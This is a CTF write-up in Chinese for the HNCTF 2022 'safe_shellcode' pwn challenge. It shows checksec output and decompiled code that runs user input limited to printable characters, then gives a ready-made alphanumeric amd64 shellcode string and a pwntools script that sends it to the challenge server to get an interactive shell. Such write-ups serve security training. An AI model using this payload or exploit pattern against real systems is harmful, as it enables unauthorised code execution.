# nssctf [HNCTF 2022 Week1]safe_shellcode wp

## 题面
可见字符shellcode

## 分析
查看保护：
``` bash
❯ pwn checksec --file=shellcoder
[*] '/data/project/ctf-repo/pwn/nssctf/safe_shellcode/shellcoder'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

带 NX 保护。  
ida pro 反汇编看看：
``` c
  mprotect((void *)((unsigned __int64)&stdout & 0xFFFFFFFFFFFFF000LL), 0x1000u, 7);
  memset(s, 0, 0x200u);
  read(0, s, 0x300u);
  for ( i = 0; ; ++i )
  {
    v3 = i;
    if ( v3 >= strlen(s) )
      break;
    if ( s[i] <= 47 || s[i] > 122 )
    {
      puts("Hacker!!!");
      exit(0);
    }
  }
  strcpy(buff, s);
  (*(void (**)(void))buff)();
  return 0;
}
```

足够的地方写 shellcode ，下面直接给了一个函数执行的地方。但是前面有判断 shellcode 只能是可打印的字符 `s[i] <= 47 || s[i] > 122` 挺麻烦的。  

从别的地方搞来一个纯 printable 的 shellcode:  
```
Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
```

直接 sned 即可:

## exp
``` python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")
context.gdb_binary = "/bin/pwndbg"

#io = process("./shellcoder")
io = remote("node5.anna.nssctf.cn", 21397)

shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
print(len(shellcode))

io.send(shellcode)

io.interactive()
```

